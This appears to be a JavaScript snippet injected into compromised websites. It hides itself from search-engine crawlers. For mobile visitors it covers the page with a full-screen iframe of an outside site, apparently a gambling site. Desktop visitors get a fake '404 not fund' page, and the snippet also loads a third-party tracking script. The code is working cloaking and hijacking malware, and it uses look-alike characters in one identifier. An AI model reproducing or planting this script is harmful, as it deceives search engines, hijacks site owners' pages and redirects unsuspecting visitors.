var reg = /(Baiduspider|360Spider|YisouSpider|YandexBot|Sogou inst spider|Sogou web spider|spider)/i;
if (!reg.test(navigator.userAgent)) {
let flag = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i);
if (flag) {
//k
  _src ='https://www.360yyds.com'
} else {
// PC
  οnlοad=function chaTitle() {
    var curTitle='404 not fund';
    window.document.title+=" - "+curTitle;
}
  _src = '/404.html'
}
document.write('<meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1">');
var hd = document.head;
var styleCSS = document.createElement('style'), yabo = document.createElement('div');
styleCSS.innerHTML = 'html,body{position:relative;width:auto !important;height:100% !important;min-width:auto !important;overflow:hidden;}.yabo{position:fixed;top:0;left:0;right:0;height:100%;z-index:9999999999;background:#fff;}';
yabo.setAttribute('class', 'yabo');
yabo.innerHTML = '<iframe src='+ _src +' frameborder="0" style="position:fixed;top:0;left:0;width:100% !important;height:100% !important;max-height: none !important;"></iframe>';
hd.appendChild(styleCSS);
hd.parentNode.appendChild(yabo);
}
document.write("<script>!function(p){\"use strict\";!function(t){var s=window,e=document,i=p,c=\"\".concat(\"https:\"===e.location.protocol?\"https://\":\"http://\",\"sdk.51.la/js-sdk-pro.min.js\"),n=e.createElement(\"script\"),r=e.getElementsByTagName(\"script\")[0];n.type=\"text/javascript\",n.setAttribute(\"charset\",\"UTF-8\"),n.async=!0,n.src=c,n.id=\"LA_COLLECT\",i.d=n;var o=function(){s.LA.ids.push(i)};s.LA?s.LA.ids&&o():(s.LA=p,s.LA.ids=[],o()),r.parentNode.insertBefore(n,r)}()}({id:\"K5RgmDbX9GG2XzWG\",ck:\"K5RgmDbX9GG2XzWG\"});</script>")
